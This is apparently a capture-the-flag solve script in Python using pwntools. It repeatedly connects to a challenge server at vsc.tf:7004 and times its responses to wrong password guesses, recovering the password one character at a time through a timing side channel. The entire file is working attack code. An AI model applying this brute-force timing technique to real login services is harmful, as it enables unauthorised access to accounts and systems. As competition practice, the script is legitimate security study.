#!/usr/bin/python3

from pwn import *
import time
exe = ELF('shs', checksec=False)
from tqdm import *
context.binary = exe
context.log_level = "error"


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()

for i in trange(104, 0x20, -1):
    p = remote('vsc.tf', 7004)
    # p = process('shs')
    # GDB()
    p.recvuntil(b'password:')
    start = time.time()
    pa = b'wSotq}JQUe' + chr(i).encode()
    pa = pa.ljust(10)
    sl(pa)
    p.recvuntil(b'Wrong')
    end = time.time()
    print((end - start), chr(i), i)
    p.close()
    sleep(0.1)
